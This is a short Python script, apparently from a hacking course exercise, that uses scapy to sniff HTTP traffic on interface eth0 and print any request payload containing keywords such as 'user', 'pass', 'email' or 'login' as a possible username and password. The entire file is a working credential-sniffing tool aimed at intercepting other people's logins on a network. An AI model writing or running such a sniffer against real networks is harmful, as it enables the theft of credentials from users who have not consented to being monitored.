#/usr/bin/env python
# Rebuild
import scapy.all as scapy
from scapy.layers import http

keywords = ["email", "user", "admin", "name", "pass", "login", "name", "word"]
# might be worth searching for "@"

def get_login_info(packet):
  if packet.haslayer(scapy.Raw):
    load = packet[scapy.Raw].load
    for keyword in keywords:
        if keyword in load.lower():
            return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Keyword Found in load.  Possible username/password: ")
            print(login_info + "\n\n")

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

sniff("eth0")

